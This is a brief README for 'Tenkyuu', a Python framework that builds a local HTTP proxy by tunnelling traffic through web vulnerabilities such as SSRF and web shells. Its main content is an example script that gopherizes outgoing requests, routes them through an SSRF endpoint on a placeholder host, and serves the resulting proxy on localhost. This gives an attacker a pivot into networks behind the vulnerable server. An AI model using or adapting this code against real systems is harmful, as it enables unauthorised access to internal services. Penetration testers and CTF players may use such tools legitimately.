# Tenkyuu

A framework to create a HTTP Proxy through web vulunerabilities (SSRF, WebShell, etc.) quickly. 

## Usage

Firstly, install the package from pypi. 

```bash
pip install tenkyuu
```

Then code your proxy rules. For example:

```python
from tenkyuu import Tenkyuu, internal_server_error
import requests

app = Tenkyuu(verbose = True)

def ssrf_proxy(req):
    # The req param is an object that contains the information of HTTP Request(s)

    # The req.gopherize() function will convert HTTP Request Packet 
    # to `gopher://...` protocol automatically
    gopherized_url = req.gopherize() 
    
    # Assume that the server has a ssrf vulunerale entrance
    # and supports gopher:// protocol, responsing with data 
    # in JSON format
    resp = requests.get("http://vulunerable.com/ssrf.php", params = {
        "url": gopherized_url
    }).json()

    if resp["status"] != "OK":
        return internal_server_error()

    return resp["data"]

if __name__ == "__main__":
    app.run(
        handler = ssrf_proxy,
        host = "127.0.0.1", 
        port = 8088
    )
```

Run the script and set your HTTP Proxy to `127.0.0.1:8088` in the application you will use.

## License

Apache License